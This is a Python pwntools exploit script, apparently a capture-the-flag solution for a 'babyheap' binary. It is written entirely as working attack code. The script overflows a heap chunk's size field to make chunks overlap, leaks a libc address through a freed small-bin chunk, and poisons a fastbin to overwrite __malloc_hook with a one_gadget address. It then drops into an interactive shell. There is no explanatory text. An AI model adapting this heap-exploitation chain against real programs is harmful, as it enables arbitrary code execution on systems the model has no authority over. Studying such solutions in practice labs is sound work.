from pwn import *

heapbase = 0x555555757000
p = process("./babyheap")

dataSize1 = 32
dataSize2 = 128

def alloc(size):
	p.recv()
        p.sendline('1')         
        p.recv()
        p.sendline(str(size))

def fill(idx, size, content):
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(idx))
        p.recv()
        p.sendline(str(size))
        p.recv()
        p.sendline(str(content))

def free(idx):
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(str(idx))

def show(idx):
	p.recv()
	p.sendline('4')
	p.recv()
	p.sendline(str(idx))
	p.recvline()
	return p.recvline()

alloc(dataSize1)		# idx0(fastbin)
alloc(dataSize1)		# idx1(fastbin)
alloc(dataSize1)		# idx2(fastbin)
alloc(dataSize1)		# idx3(fastbin)
alloc(dataSize2)		# idx4(smallbin)

payload="\x00"*dataSize1 + p64(0) + p64(dataSize1+17)	# control the size of idx4
fill(3, len(payload), payload)

free(2)
free(1)

payload="\x00"*dataSize1 + p64(0) + p64(dataSize1+17) + p8((dataSize1+16)*4)
fill(0, len(payload), payload)
alloc(dataSize1)		# idx1
alloc(dataSize1)		# idx2 == idx4
alloc(dataSize2)		# make fd,bk in idx4

payload="\x00"*dataSize1 + p64(0) + p64(dataSize2+17)   # control the size of idx4
fill(3, len(payload), payload)

free(4)
leaked = show(2)

libcbase = u64(leaked[0:8]) - 0x3c4b78		# offset in local environment
oneGadget = libcbase + 0x4526a
addr = libcbase + 0x3c4b10 - 0x23

print "libc base : " + str(hex(libcbase))

alloc(0x60)			# idx4
free(4)				# clear

payload = p64(addr)
fill(2, len(payload), payload)

alloc(0x60)			# idx5
alloc(0x60)			# idx6, to overwrite malloc_hook

payload = "\x00"*3 + p64(0)*2 + p64(oneGadget)
fill(6, len(payload), payload)

alloc(32)
p.interactive()
